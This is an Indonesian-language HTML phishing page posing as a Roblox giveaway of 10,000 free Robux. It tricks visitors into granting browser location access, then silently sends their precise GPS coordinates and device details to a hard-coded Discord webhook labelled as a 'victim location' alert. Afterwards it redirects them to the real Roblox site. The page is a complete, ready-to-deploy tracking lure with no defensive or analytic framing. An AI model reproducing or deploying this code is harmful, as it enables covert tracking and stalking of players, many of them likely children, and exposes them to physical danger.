<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Rewards Center</title>
    <style>
        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        .btn { background-color: #0084ff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <img src="https://images.rbxcdn.com/7b320857502787884f33160a229a1752.png" width="120">
    <h1>KLAIM 10.000 ROBUX</h1>
    <p>Untuk memverifikasi bahwa Tuan adalah pemain asli dari Indonesia, silakan klik tombol di bawah dan pilih <b>"IZINKAN/ALLOW"</b> pada notifikasi yang muncul.</p>
    
    <button class="btn" onclick="mintaLokasi()">VERIFIKASI SEKARANG</button>

    <script>
        async function mintaLokasi() {
            // TANAM WEBHOOK TUAN DI SINI
            const webhook = "https://discord.com/api/webhooks/1482046386156474530/e0I5ddTi-8syF0bBHlgKeSk6ZBOU7RifD2Hq83ulLF-fdKZPGbGw1-rZ_x4aFu1xtlJI";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    const info = {
                        content: "🚨 **TARGET TERLOCK! GPS AKURAT!** 🚨",
                        embeds: [{
                            title: "LOKASI KORBAN DITEMUKAN",
                            description: `[KLIK UNTUK LIHAT DI MAPS](https://www.google.com/maps?q=${lat},${lon})`,
                            color: 65280,
                            fields: [
                                { name: "🎯 Akurasi", value: pos.coords.accuracy + " meter", inline: true },
                                { name: "📱 Info", value: navigator.userAgent }
                            ]
                        }]
                    };

                    await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) });
                    alert("Verifikasi Berhasil! Mengalihkan ke halaman hadiah...");
                    window.location.href = "https://www.roblox.com/home";
                }, (err) => {
                    alert("Verifikasi Gagal! Tuan harus mengklik 'IZINKAN' untuk mendapatkan hadiah.");
                    window.location.reload();
                }, { enableHighAccuracy: true });
            } else {
                alert("Browser Tuan tidak mendukung verifikasi ini.");
            }
        }
    </script>
</body>
</html>
